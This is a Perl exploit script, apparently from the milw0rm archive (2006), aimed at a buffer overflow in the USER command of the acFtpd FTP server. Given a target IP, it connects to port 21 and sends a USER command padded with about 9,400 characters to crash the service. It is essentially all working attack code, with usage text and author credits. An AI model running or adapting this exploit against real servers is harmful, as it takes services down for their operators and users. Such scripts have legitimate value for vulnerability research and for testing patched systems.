 ################################################
#===== acFtpd BoF Crash Exploit =====
#
# There is a Buffer overflow at the
# USER command in acFtpd.
#
# Vuln found by: Preddy
# RootShell Security Group
#
# Usage: ac_dos.pl <ip>
################################################

use IO::Socket;
use Win32;
use strict;

my($i)      = "";
my($socket) = "";
my $overflow = "A{" x 4700;

if($ARGV[0] == "")
{
print "################################################\n";
print "# ===== acFtpd BoF Crash Exploit =====\n";
print "#\n";
print "# Vuln found by: Preddy\n";
print "# RootShell Security Group\n";
print "# www.rootshell-security.net\n";
print "#\n";
print "# Usage ac_dos.pl <ip>\n";
print "################################################\n";
}

        if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                            PeerPort => "21",
                                            Proto    => "TCP"))
        {
                print "Sending Overflow String!\n";
                print "Ftp should be crashed!\n";

                Win32::Sleep(300);

                print $socket "USER $overflow\r\n";

                Win32::Sleep(100);


                close($socket);
        }

# milw0rm.com [2006-05-04]